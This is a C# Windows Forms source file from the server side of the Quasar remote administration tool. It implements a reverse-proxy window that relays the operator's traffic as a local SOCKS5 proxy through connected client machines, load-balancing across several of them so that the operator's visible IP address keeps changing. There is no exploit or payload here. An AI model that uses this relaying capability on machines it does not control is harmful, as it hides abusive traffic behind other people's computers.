using Quasar.Common.Helpers;
using Quasar.Common.Messages;
using Quasar.Server.Helper;
using Quasar.Server.Messages;
using Quasar.Server.Models;
using Quasar.Server.Networking;
using Quasar.Server.ReverseProxy;
using System;
using System.Globalization;
using System.Net.Sockets;
using System.Windows.Forms;

namespace Quasar.Server.Forms
{
    public partial class FrmReverseProxy : Form
    {
        /// <summary>
        /// The clients which can be used for the reverse proxy.
        /// </summary>
        private readonly Client[] _clients;

        /// <summary>
        /// The message handler for handling the communication with the clients.
        /// </summary>
        private readonly ReverseProxyHandler _reverseProxyHandler;

        /// <summary>
        /// The open reverse proxy connections.
        /// </summary>
        private ReverseProxyClient[] _openConnections;

        /// <summary>
        /// Initializes a new instance of the <see cref="FrmReverseProxy"/> class using the given clients.
        /// </summary>
        /// <param name="clients">The clients used for the reverse proxy form.</param>
        public FrmReverseProxy(Client[] clients)
        {
            this._clients = clients;
            this._reverseProxyHandler = new ReverseProxyHandler(clients);

            RegisterMessageHandler();
            InitializeComponent();
        }

        /// <summary>
        /// Registers the reverse proxy message handler for client communication.
        /// </summary>
        private void RegisterMessageHandler()
        {
            //_connectClient.ClientState += ClientDisconnected;
            _reverseProxyHandler.ProgressChanged += ConnectionChanged;
            MessageHandler.Register(_reverseProxyHandler);
        }

        /// <summary>
        /// Unregisters the reverse proxy message handler.
        /// </summary>
        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_reverseProxyHandler);
            _reverseProxyHandler.ProgressChanged -= ConnectionChanged;
            //_connectClient.ClientState -= ClientDisconnected;
        }

        /// <summary>
        /// Called whenever a client disconnects.
        /// </summary>
        /// <param name="client">The client which disconnected.</param>
        /// <param name="connected">True if the client connected, false if disconnected</param>
        /// TODO: Handle disconnected clients
        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
            {
                this.Invoke((MethodInvoker)this.Close);
            }
        }

        private void FrmReverseProxy_Load(object sender, EventArgs e)
        {
            if (_clients.Length > 1)
            {
                this.Text = "Reverse Proxy [Load-Balancer is active]";
                lblLoadBalance.Text = "The Load Balancer is active, " + _clients.Length + " clients will be used as proxy\r\nKeep refreshing at www.ipchicken.com to see if your ip address will keep changing, if so, it works";
            }
            else if (_clients.Length == 1)
            {
                this.Text = WindowHelper.GetWindowTitle("Reverse Proxy", _clients[0]);
                lblLoadBalance.Text = "The Load Balancer is not active, only 1 client is used, select multiple clients to activate the load balancer";
            }
            nudServerPort.Value = Settings.ReverseProxyPort;
        }

        private void FrmReverseProxy_FormClosing(object sender, FormClosingEventArgs e)
        {
            Settings.ReverseProxyPort = GetPortSafe();
            UnregisterMessageHandler();
            _reverseProxyHandler.Dispose();
        }

        private void ConnectionChanged(object sender, ReverseProxyClient[] proxyClients)
        {
            lock (_reverseProxyHandler)
            {
                lstConnections.BeginUpdate();
                _openConnections = proxyClients;
                lstConnections.VirtualListSize = _openConnections.Length;
                lstConnections.EndUpdate();
            }
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            try
            {
                ushort port = GetPortSafe();

                if (port == 0)
                {
                    MessageBox.Show("Please enter a valid port > 0.", "Please enter a valid port", MessageBoxButtons.OK,
                        MessageBoxIcon.Warning);
                    return;
                }

                _reverseProxyHandler.StartReverseProxyServer(port);
                ToggleConfigurationButtons(true);
            }
            catch (SocketException ex)
            {
                if (ex.ErrorCode == 10048)
                {
                    MessageBox.Show("The port is already in use.", "Listen Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                else
                {
                    MessageBox.Show($"An unexpected socket error occurred: {ex.Message}\n\nError Code: {ex.ErrorCode}",
                        "Unexpected Listen Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"An unexpected error occurred: {ex.Message}", "Unexpected Listen Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        /// <summary>
        /// Safely gets the value from the <see cref="nudServerPort"/> and parses it as <see cref="ushort"/>.
        /// </summary>
        /// <returns>The server port parsed as <see cref="ushort"/>. Returns <value>0</value> on error.</returns>
        private ushort GetPortSafe()
        {
            var portValue = nudServerPort.Value.ToString(CultureInfo.InvariantCulture);
            return (!ushort.TryParse(portValue, out ushort port)) ? (ushort)0 : port;
        }

        /// <summary>
        /// Toggles the activatability of configuration controls.
        /// </summary>
        /// <param name="started">When set to <code>true</code> the configuration controls get enabled, otherwise they get disabled.</param>
        private void ToggleConfigurationButtons(bool started)
        {
            btnStart.Enabled = !started;
            nudServerPort.Enabled = !started;
            btnStop.Enabled = started;
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            ToggleConfigurationButtons(false);
            _reverseProxyHandler.StopReverseProxyServer();
        }

        private void nudServerPort_ValueChanged(object sender, EventArgs e)
        {
            lblProxyInfo.Text = string.Format("Connect to this SOCKS5 Proxy: 127.0.0.1:{0} (no user/pass)", nudServerPort.Value);
        }

        private void LvConnections_RetrieveVirtualItem(object sender, RetrieveVirtualItemEventArgs e)
        {
            lock (_reverseProxyHandler)
            {
                if (e.ItemIndex < _openConnections.Length)
                {
                    ReverseProxyClient connection = _openConnections[e.ItemIndex];

                    e.Item = new ListViewItem(new string[]
                    {
                        connection.Client.EndPoint.ToString(),
                        connection.Client.Value.Country,
                        (connection.HostName.Length > 0 && connection.HostName != connection.TargetServer) ? string.Format("{0}  ({1})", connection.HostName, connection.TargetServer) : connection.TargetServer,
                        connection.TargetPort.ToString(),
                        StringHelper.GetHumanReadableFileSize(connection.LengthReceived),
                        StringHelper.GetHumanReadableFileSize(connection.LengthSent),
                        connection.Type.ToString()
                    }) { Tag = connection };
                }
            }
        }

        private void killConnectionToolStripMenuItem_Click(object sender, EventArgs e)
        {
            lock (_reverseProxyHandler)
            {
                if (lstConnections.SelectedIndices.Count > 0)
                {
                    //copy the list, it could happen that suddenly the items de-select
                    int[] items = new int[lstConnections.SelectedIndices.Count];
                    lstConnections.SelectedIndices.CopyTo(items, 0);

                    foreach (int index in items)
                    {
                        if (index < _openConnections.Length)
                        {
                            ReverseProxyClient connection = _openConnections[index];
                            connection?.Disconnect();
                        }
                    }
                }
            }
        }
    }
}
